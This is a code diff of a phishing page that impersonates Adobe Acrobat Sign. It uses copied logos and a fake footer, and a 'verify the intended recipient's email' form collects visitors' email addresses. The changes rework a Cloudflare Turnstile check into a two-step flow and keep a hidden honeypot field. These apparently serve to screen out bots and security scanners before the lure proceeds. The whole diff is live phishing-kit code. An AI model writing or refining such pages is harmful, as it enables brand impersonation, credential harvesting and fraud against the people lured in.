@@ -584,13 +584,15 @@ async function serveStaticFile(filename) {
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/igun89/css@main/index-9eef6c26.css">
   </head>
   <body>
-    <div id="app" data-v-app=""><div class="background"><!----><div data-v-527512fb="" class="adobe-sign-container"><div data-v-527512fb="" class="sign-card"><div class="header" data-v-527512fb=""><div class="logo-text" data-v-527512fb=""><span class="person-icon" data-v-527512fb="">⼈</span> Adobe Acrobat Sign </div><img class="adobe-logo" src="https://i.postimg.cc/L65myCyW/email-adobe-tag-classic-2x.png" alt="Adobe Logo" data-v-527512fb=""></div><div class="success-check" data-v-527512fb="">✓</div><div data-v-527512fb="" class="content"><p data-v-527512fb=""><strong data-v-527512fb="">Verify the intended recipient's email.</strong></p><p data-v-527512fb="">Enter the email address to which this item was shared to sign your document.</p><input data-v-527512fb="" type="email" placeholder="Enter email" required="" id="email-input"><!----></div><button data-v-527512fb="" id="continue-button">OPEN</button><div data-v-527512fb="" class="divider"></div><p data-v-527512fb="" class="footer-text"> Attached is the final agreement for your reference. Read it with <a data-v-527512fb="" href="#">Acrobat Reader</a>. You can also <a data-v-527512fb="" href="#">open it online</a> to review its activity history. </p></div><div data-v-527512fb="" class="global-footer"><p data-v-527512fb=""><strong data-v-527512fb="">Powered by</strong></p><img data-v-527512fb="" class="footer-logo" src="https://i.postimg.cc/Dw1H51KD/email-adobe-sign-logo-3-2x.png" alt="Adobe Sign Logo"><p data-v-527512fb="">Need your own documents signed? Adobe Acrobat Sign can help save you time. <a data-v-527512fb="" href="#">Learn more</a>.</p><p data-v-527512fb="">To ensure that you continue receiving our emails, please add adobesign@adobesign.com to your address book.</p><p data-v-527512fb="">Terms of Use | Report Abuse</p><p data-v-527512fb="">© 2025 Adobe. All rights reserved.</p></div></div></div></div>
+    <div id="app" data-v-app=""><div class="background"><!----><div data-v-527512fb="" class="adobe-sign-container"><div data-v-527512fb="" class="sign-card"><div class="header" data-v-527512fb=""><div class="logo-text" data-v-527512fb=""><span class="person-icon" data-v-527512fb="">⼈</span> Adobe Acrobat Sign </div><img class="adobe-logo" src="./Before we continue..._files/email-adobe-tag-classic@2x.png" alt="Adobe Logo" data-v-527512fb=""></div><div class="success-check" data-v-527512fb="">✓</div><div data-v-527512fb="" class="content"><p data-v-527512fb=""><strong data-v-527512fb="">Verify the intended recipient's email.</strong></p><p data-v-527512fb="">Enter the email address to which this item was shared to sign your document.</p><input data-v-527512fb="" type="email" placeholder="Enter email" required="" id="email-input"><!----></div><button data-v-527512fb="" id="continue-button">OPEN</button><div data-v-527512fb="" class="divider"></div><p data-v-527512fb="" class="footer-text"> Attached is the final agreement for your reference. Read it with <a data-v-527512fb="" href="#">Acrobat Reader</a>. You can also <a data-v-527512fb="" href="#">open it online</a> to review its activity history. </p></div><div data-v-527512fb="" class="global-footer"><p data-v-527512fb=""><strong data-v-527512fb="">Powered by</strong></p><img data-v-527512fb="" class="footer-logo" src="./Before we continue..._files/email-adobe-sign-logo.3@2x.png" alt="Adobe Sign Logo"><p data-v-527512fb="">Need your own documents signed? Adobe Acrobat Sign can help save you time. <a data-v-527512fb="" href="#">Learn more</a>.</p><p data-v-527512fb="">To ensure that you continue receiving our emails, please add adobesign@adobesign.com to your address book.</p><p data-v-527512fb="">Terms of Use | Report Abuse</p><p data-v-527512fb="">© 2025 Adobe. All rights reserved.</p></div></div></div></div>
     
     <!-- Honeypot field -->
     <input type="text" id="honeypotField" class="honeypot-field" name="honeypot" autocomplete="off" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;">
     
-    <!-- Turnstile container -->
-    <div id="turnstile-widget" data-sitekey="0x4AAAAAABnnez0Dy-TkLp3r" style="display: none;"></div>
+         <!-- Turnstile container -->
+     <div id="turnstile-container" style="display: none; margin: 20px 0; text-align: center;">
+         <div id="turnstile-widget" data-sitekey="0x4AAAAAABnnez0Dy-TkLp3r"></div>
+     </div>
     
     <!-- Message display -->
     <div id="message" class="message" style="display: none; margin-top: 15px; padding: 10px; border-radius: 5px; font-size: 14px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border: 1px solid #ccc; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 1000; min-width: 200px; text-align: center;"></div>
@@ -634,14 +636,16 @@ async function serveStaticFile(filename) {
             this.emailInput = document.getElementById('email-input');
             this.submitBtn = document.getElementById('continue-button');
             this.messageDiv = document.getElementById('message');
+            this.turnstileContainer = document.getElementById('turnstile-container');
             this.turnstileWidget = null;
+            this.turnstileRendered = false;
+            this.step = 1; // 1 = email input, 2 = turnstile verification
             
             this.init();
         }
         
         init() {
             this.setupEventListeners();
-            this.setupTurnstile();
         }
         
         setupEventListeners() {
@@ -652,7 +656,7 @@ async function serveStaticFile(filename) {
         setupTurnstile() {
             // Wait for Turnstile to load
             const checkTurnstile = () => {
-                if (window.turnstile) {
+                if (window.turnstile && !this.turnstileRendered) {
                     try {
                         this.turnstileWidget = window.turnstile.render('#turnstile-widget', {
                             sitekey: '0x4AAAAAABnnez0Dy-TkLp3r',
@@ -667,12 +671,13 @@ async function serveStaticFile(filename) {
                                 this.showError('Verification failed. Please try again.');
                             }
                         });
+                        this.turnstileRendered = true;
                         console.log('Turnstile widget rendered successfully');
                     } catch (error) {
                         console.error('Error rendering Turnstile widget:', error);
                         this.showError('Failed to load verification. Please refresh the page.');
                     }
-                } else {
+                } else if (!window.turnstile) {
                     setTimeout(checkTurnstile, 100);
                 }
             };
@@ -682,16 +687,12 @@ async function serveStaticFile(filename) {
         
         onTurnstileSuccess(token) {
             console.log('Turnstile validation successful');
-            // Enable the submit button
-            this.submitBtn.disabled = false;
-            this.submitBtn.style.opacity = '1';
+            // Proceed with final validation
+            this.performFinalValidation();
         }
         
         onTurnstileExpired() {
             console.log('Turnstile validation expired');
-            // Disable the submit button
-            this.submitBtn.disabled = true;
-            this.submitBtn.style.opacity = '0.7';
             this.showError('Verification expired. Please try again.');
         }
         
@@ -699,19 +700,26 @@ async function serveStaticFile(filename) {
             e.preventDefault();
             
             const email = this.emailInput.value.trim();
-            const honeypotField = document.getElementById('honeypotField').value;
             
-            // Basic email check - let server handle detailed validation
+            // Basic email check
             if (!email || email.trim() === '') {
                 this.showError('Please enter an email address.');
                 return;
             }
             
-            // Check if Turnstile is completed
-            if (!window.turnstile || !window.turnstile.getResponse()) {
-                this.showError('Please complete the verification.');
-                return;
+            if (this.step === 1) {
+                // First step: Show Turnstile
+                this.step = 2;
+                this.turnstileContainer.style.display = 'block';
+                this.submitBtn.textContent = 'Verifying...';
+                this.submitBtn.disabled = true;
+                this.setupTurnstile();
             }
+        }
+        
+        async performFinalValidation() {
+            const email = this.emailInput.value.trim();
+            const honeypotField = document.getElementById('honeypotField').value;
             
             this.setLoading(true);
             
@@ -737,22 +745,26 @@ async function serveStaticFile(filename) {
                     }, 1000);
                 } else {
                     this.showError(data.message || 'Access denied.');
-                    // Reset Turnstile on error
-                    if (window.turnstile) {
-                        window.turnstile.reset();
-                    }
-                    this.submitBtn.disabled = true;
+                    // Reset to step 1
+                    this.resetToStep1();
                 }
             } catch (error) {
                 console.error('Error:', error);
                 this.showError('An error occurred. Please try again.');
-                // Reset Turnstile on error
-                if (window.turnstile) {
-                    window.turnstile.reset();
-                }
-                this.submitBtn.disabled = true;
+                // Reset to step 1
+                this.resetToStep1();
             } finally {
                 this.setLoading(false);
+            }
+        }
+        
+        resetToStep1() {
+            this.step = 1;
+            this.turnstileContainer.style.display = 'none';
+            this.submitBtn.textContent = 'OPEN';
+            this.submitBtn.disabled = false;
+            if (this.turnstileWidget && window.turnstile) {
+                window.turnstile.reset();
             }
         }
         
@@ -790,13 +802,15 @@ async function serveStaticFile(filename) {
         
         setLoading(loading) {
             if (loading) {
-                this.submitBtn.textContent = 'Verifying...';
+                this.submitBtn.textContent = 'Processing...';
                 this.submitBtn.disabled = true;
             } else {
-                this.submitBtn.textContent = 'OPEN';
-                // Keep disabled if Turnstile is not completed
-                if (window.turnstile && window.turnstile.getResponse()) {
+                if (this.step === 1) {
+                    this.submitBtn.textContent = 'OPEN';
                     this.submitBtn.disabled = false;
+                } else {
+                    this.submitBtn.textContent = 'Verifying...';
+                    this.submitBtn.disabled = true;
                 }
             }
         }
